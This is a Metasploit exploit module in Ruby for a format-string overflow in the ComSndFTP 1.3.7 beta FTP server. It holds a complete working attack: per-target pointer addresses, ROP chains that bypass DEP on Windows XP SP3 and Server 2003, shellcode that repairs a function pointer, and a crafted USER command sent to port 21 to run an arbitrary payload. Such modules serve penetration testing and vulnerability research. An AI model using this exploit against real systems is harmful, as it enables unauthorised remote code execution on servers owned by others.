# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;          => &#039;ComSndFTP v1.3.7 Beta USER Buffer Overflow&#039;,
            &#039;Description&#039;   => %q{
                    This module exploits the ComSndFTP FTP Server version 1.3.7 beta by sending a specially
                crafted format string specifier as a username. The crafted username is sent to to the server to
                overwrite the hardcoded function pointer from Ws2_32.dll!WSACleanup. Once this function pointer
                is triggered, the code bypasses dep and then repairs the pointer to execute arbitrary code.
                for continuous exploitation.
            },
            &#039;Author&#039;        =>
                [
                    &#039;ChaoYi Huang <ChaoYi.Huang[at]connect.polyu.hk>&#039;, # vuln discovery + poc
                    &#039;rick2600 <rick2600[at]corelan.be>&#039;,               # msf module (target XP)
                    &#039;mr_me <mr_me[at]@corelan.be>&#039;,                    # msf module (target 23k)
                    &#039;corelanc0d3r <peter.ve[at]corelan.be>&#039;            # msf module
                ],
            &#039;Arch&#039;          => [ ARCH_X86 ],
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Version&#039;       => &#039;$Revision$&#039;,
            &#039;References&#039;    =>
                [
                    # When a DoS is NOT a DoS
                    [ &#039;EDB&#039;, &#039;19024&#039;]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;
                },
            &#039;Platform&#039;      => [&#039;win&#039;],
            &#039;Privileged&#039;    => false,
            &#039;Payload&#039;       =>
                {
                    &#039;Space&#039;            => 1000,
                    &#039;BadChars&#039;         => "\x00\x0a\x0d",
                    &#039;StackAdjustment&#039;  => -3500,
                    &#039;DisableNops&#039;      => &#039;True&#039;
                },
            &#039;Targets&#039;       =>
                [
                    [
                        &#039;Windows XP SP3 - English&#039;,
                        {
                            &#039;Functionpointer&#039;   => 0x71AC4050,  # winsock pointer
                            &#039;Functionaddress&#039;   => 0x71AB2636,  # the repair address
                            &#039;Pivot&#039;             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn
                            &#039;Pad&#039; => 568
                        }
                    ],
                    [
                        &#039;Windows Server 2003 - English&#039;,
                        {
                            &#039;Functionpointer&#039;   => 0x71C14044,  # winsock pointer
                            &#039;Functionaddress&#039;   => 0x71C02661,  # the repair address
                            &#039;Pivot&#039;             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn
                            &#039;Pad&#039; => 568
                        }
                    ]
                ],
            &#039;DisclosureDate&#039; => &#039;Jun 08 2012&#039;))
 
        register_options(
            [
                Opt::RPORT(21),
            ], self.class)
    end
 
    def check
        connect
        banner    = sock.get(-1,3)
        validate  = "\x32\x32\x30\x20\xbb\xb6\xd3\xad\xb9"
        validate << "\xe2\xc1\xd9\x46\x54\x50\xb7\xfe\xce"
        validate << "\xf1\xc6\xf7\x21\x0d\x0a"
        disconnect
 
        if (banner == validate)
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
 
    def junk(n=4)
        return rand_text_alpha(n).unpack("V").first
    end
 
    def exploit
 
        rop = &#039;&#039;
        if target.name =~ /Server 2003/
            # C:\WINDOWS\system32\msvcrt.dll v7.0.3790.3959
            rop = [
                0x77be3adb, # pop eax ; retn
                0x77ba1114, # <- *&VirtualProtect()
                0x77bbf244, # mov eax,[eax] ; pop ebp ; retn
                junk,
                0x77bb0c86, # xchg eax,esi ; retn
                0x77be3adb, # pop eax ; retn
                0xFFFFFBFF, # dwSize
                0x77BAD64D, # neg eax ; pop ebp ; retn
                junk,
                0x77BBF102, # xchg eax,ebx ; add [eax],al ; retn
                0x77bbfc02, # pop ecx ; retn
                0x77bef001, # ptr that is w+
                0x77bd8c04, # pop edi ; retn
                0x77bd8c05, # retn
                0x77be3adb, # pop eax ; retn
                0xFFFFFFC0, # flNewProtect
                0x77BAD64D, # neg eax ; pop ebp ; retn
                0x77be2265, # ptr to &#039;push esp ; ret&#039;
                0x77BB8285, # xchg eax,edx ; retn
                0x77be3adb, # pop eax ; retn
                0x90909090, # nops
                0x77be6591, # pushad ; add al,0ef ; retn
            ].pack("V*")
 
        elsif target.name =~ /XP SP3/
            # C:\WINDOWS\system32\msvcrt.dll v7.0.2600.5512
            rop = [
                0x77C21D16, # pop eax ; retn
                0x77C11120, # <- *&VirtualProtect()
                0x77C2E493, # mov eax,[eax] ; pop ebp ; retn
                junk,
                0x77C21891, # pop esi ; retn
                0x77C5D010, # ptr that is w+
                0x77C2DD6C, # xchg eax,esi ; add [eax],al; retn
                0x77C21D16, # pop eax ; retn
                0xFFFFFBFF, # dwSize
                0x77C1BE18, # neg eax ; pop ebp ; retn
                junk,
                0x77C2362C, # pop ebx ; retn
                0x77C5D010, # ptr that is w+
                0x77C2E071, # xchg eax,ebx ; add [eax],al ; retn
                0x77C1F519, # pop ecx ; retn
                0x77C5D010, # ptr that is w+
                0x77C23B47, # pop edi ; retn
                0x77C23B48, # retn
                0x77C21D16, # pop eax ; retn
                0xFFFFFFC0, # flNewProtect
                0x77C1BE18, # neg eax ; pop ebp ; retn
                0x77C35459, # ptr to &#039;push esp ; ret&#039;
                0x77C58FBC, # xchg eax,edx ; retn
                0x77C21D16, # pop eax ; retn
                0x90909090, # nops
                0x77C567F0, # pushad ; add al,0ef ; retn
            ].pack("V*")
        end
 
        stage1 = %Q{
            mov eax, #{target[&#039;Functionpointer&#039;]}
            mov ecx, #{target[&#039;Functionaddress&#039;]}
            mov [eax], ecx
        }
 
        offset_wp = rand_text_alphanumeric(1)
        pivot     = target[&#039;Pivot&#039;]
        offset    = target[&#039;Pad&#039;] + rop.length + stage1.length + payload.encoded.length
 
        attackstring  = rand_text_alphanumeric(7)
        attackstring << [target[&#039;Functionpointer&#039;]].pack(&#039;V&#039;)
        attackstring << "%#{pivot}x"                          # special pointer to our pivot
        attackstring << "%p" * 208 + "#{offset_wp }%n"        # format specifiers to read and write the function pointer
        attackstring << rand_text_alphanumeric(target[&#039;Pad&#039;])
        attackstring << rop
        attackstring << Metasm::Shellcode.assemble(Metasm::Ia32.new, stage1).encode_string
        attackstring << payload.encoded
        attackstring << rand_text_alphanumeric(2000 - offset)
        attackstring << "\r\n"
 
        sploit = "USER #{attackstring}\r\n"
 
        print_status("Triggering overflow...")
        connect
        sock.get_once(1024)
        sock.put(sploit)
        select(nil, nil, nil, 2)
        handler
        disconnect
 
    end
 
end



